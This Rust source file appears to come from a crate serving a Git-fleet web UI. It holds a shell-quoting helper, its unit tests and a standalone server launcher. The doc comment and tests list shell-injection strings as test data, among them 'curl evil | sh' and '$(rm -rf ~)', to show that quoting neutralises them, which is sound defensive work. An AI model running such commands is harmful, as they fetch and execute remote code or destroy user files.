//! cohors-web — native server half.
//!
//! On the host this crate is the `cohors web` HTTP server (see [`server`]); the
//! `cohors` binary launches it via [`serve`], and the crate's own binary
//! ([`standalone`]) is a thin self-contained launcher. On `wasm32` the lib
//! holds only the few items both halves share (the verb lists and
//! [`shell_quote`]) — there the crate's bin is the Leptos browser page instead.

#![forbid(unsafe_code)]

/// The action verbs the browser's action bar offers — one button per registry
/// verb, in registry order. Compiled on both targets so the native server test
/// can enforce write parity with `cohors_actions::registry()`.
pub const ACTION_VERBS: &[&str] = &["fetch", "pull", "push", "commit", "stash", "run"];

/// The verbs whose registry entry demands a deliberate `confirm` — the browser
/// runs these through a server-side dry-run preview + a Confirm click.
pub const CONFIRM_VERBS: &[&str] = &["commit", "stash", "run"];

/// Quote `text` as one word for a POSIX shell: wrap it in single quotes and
/// write each embedded single quote as `'\''` (close the quote, an escaped
/// quote, reopen).
///
/// The page shows commands for the user to copy and paste into a terminal.
/// Any part of such a command that comes from the fleet (a repository path, a
/// name, an id) is attacker-influenced: a cloned repository's folder can be
/// called `x'; curl evil | sh; '` or contain `$(…)`. Inside single quotes the
/// shell expands nothing, so a value passed through here is always one inert
/// argument. Every command the page builds from fleet data must use it.
///
/// Compiled on both targets so the rule is unit-tested by the native gates.
pub fn shell_quote(text: &str) -> String {
    format!("'{}'", text.replace('\'', "'\\''"))
}

#[cfg(test)]
mod shell_quote_tests {
    use super::shell_quote;

    #[test]
    fn a_plain_path_is_still_quoted() {
        assert_eq!(shell_quote("/home/me/code/repo"), "'/home/me/code/repo'");
    }

    #[test]
    fn spaces_stay_inside_one_word() {
        assert_eq!(shell_quote("/home/me/my repo"), "'/home/me/my repo'");
    }

    #[test]
    fn a_single_quote_cannot_close_the_quoting() {
        assert_eq!(shell_quote("it's"), r"'it'\''s'");
        // The classic break-out attempt stays one inert word.
        assert_eq!(
            shell_quote("x'; curl evil | sh; '"),
            r"'x'\''; curl evil | sh; '\'''"
        );
    }

    #[test]
    fn substitutions_and_separators_are_not_expanded() {
        // Nothing is rewritten: single quotes alone make these literal.
        for hostile in [
            "$(rm -rf ~)",
            "a; rm -rf ~",
            "`id`",
            "a && b | c > d",
            "$HOME",
        ] {
            assert_eq!(shell_quote(hostile), format!("'{hostile}'"));
        }
    }

    #[test]
    fn an_empty_value_is_an_empty_word() {
        assert_eq!(shell_quote(""), "''");
    }
}

#[cfg(not(target_arch = "wasm32"))]
mod server;
#[cfg(not(target_arch = "wasm32"))]
pub use server::{Caps, ScanFn, ServeOptions, serve};

#[cfg(not(target_arch = "wasm32"))]
pub mod standalone {
    //! A minimal self-contained launcher (the crate's native binary): discover
    //! repos under the given roots with `cohors-git` and serve them, without the
    //! TUI's `Scanner`. The primary launcher remains `cohors web` in the TUI; this
    //! exists so the server can also run standalone (e.g. a deployed `cohors-web`).

    use std::sync::Arc;

    use anyhow::{Result, bail};
    use camino::Utf8PathBuf;
    use cohors_fleet::Scanner;

    use crate::{Caps, ServeOptions, serve};

    /// Parse `args` (everything after argv[0]) and run the server.
    ///
    /// Usage: `cohors-web <dist_dir> [--port N] [--config <path>] [--allow-writes] [--allow-run] <root>...`
    pub fn main(args: Vec<String>) -> Result<()> {
        let mut dist: Option<Utf8PathBuf> = None;
        let mut port: u16 = 8787;
        let mut caps = Caps::default();
        let mut roots: Vec<String> = Vec::new();
        let mut config: Option<Utf8PathBuf> = None;

        let mut it = args.into_iter();
        while let Some(arg) = it.next() {
            match arg.as_str() {
                "--allow-writes" => caps.allow_writes = true,
                "--allow-run" => caps.allow_run = true,
                "--port" => {
                    port = it.next().and_then(|p| p.parse().ok()).unwrap_or(port);
                }
                // Same override the TUI's --config carries, so groups/aliases
                // resolve identically across surfaces (fleet parity).
                "--config" => config = it.next().map(Utf8PathBuf::from),
                _ if dist.is_none() => dist = Some(Utf8PathBuf::from(arg)),
                _ => roots.push(arg),
            }
        }

        let Some(dist) = dist else {
            bail!(
                "usage: cohors-web <dist_dir> [--port N] [--allow-writes] [--allow-run] <root>...\n\
                 (the primary launcher is `cohors web`; this standalone form needs an explicit dist dir + roots)"
            );
        };
        // Roots may be empty: the fleet Scanner then falls back to the config's
        // roots (or auto-detection), exactly like the TUI with no --root.

        // The shared fleet Scanner: same config → discovery → groups/aliases
        // path as the TUI and MCP, with the given roots as explicit overrides.
        // This is the whole point of `cohors-fleet` — the standalone server no
        // longer hand-rolls a lesser scan (it now gets ignore globs, groups,
        // aliases, and the GitHub token for enrichment, exactly like `cohors web`).
        let scanner = Arc::new(
            Scanner::new(config.as_deref(), &roots)
                .map_err(|e| anyhow::anyhow!("building scanner: {e}"))?,
        );
        let options = ServeOptions {
            port,
            roots: scanner.roots(),
            token: scanner.github_token(),
            watch: false,
            caps,
            allowlist: scanner.actions_config().run_allowlist,
            max_targets: scanner.actions_config().max_action_targets,
            demo: false,
            author_email: scanner.author_email(),
        };
        let scan = Arc::new(move || scanner.scan());
        serve(&dist, scan, options)
    }
}
